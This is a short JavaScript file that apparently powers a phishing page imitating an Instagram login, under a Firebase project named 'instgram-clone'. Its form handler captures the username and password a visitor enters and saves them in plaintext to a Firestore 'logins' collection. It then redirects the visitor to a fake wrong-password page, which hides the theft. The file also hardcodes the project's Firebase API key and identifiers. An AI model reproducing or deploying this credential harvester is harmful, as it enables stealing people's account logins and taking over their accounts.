// Import Firebase SDK (modular)
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";

// Your Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyDAb7Sjpnn-uJxb5ZU1tN9sORffK15B9W0",
  authDomain: "instgram-clone-ed2ba.firebaseapp.com",
  projectId: "instgram-clone-ed2ba",
  storageBucket: "instgram-clone-ed2ba.firebasestorage.app",
  messagingSenderId: "467076732876",
  appId: "1:467076732876:web:b1412591270a13e22daf69",
  measurementId: "G-NK0BTJQB1W"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Attach form submit listener
document.querySelector(".login-form").addEventListener("submit", async function(e) {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  try {
    await addDoc(collection(db, "logins"), {
      username: username,
      password: password,
      timestamp: new Date()
    });
    console.log("");
    window.location.href = "wrong_password.html"; // redirect after save
  } catch (err) {
    console.error("❌ Error saving:", err);
  }
});
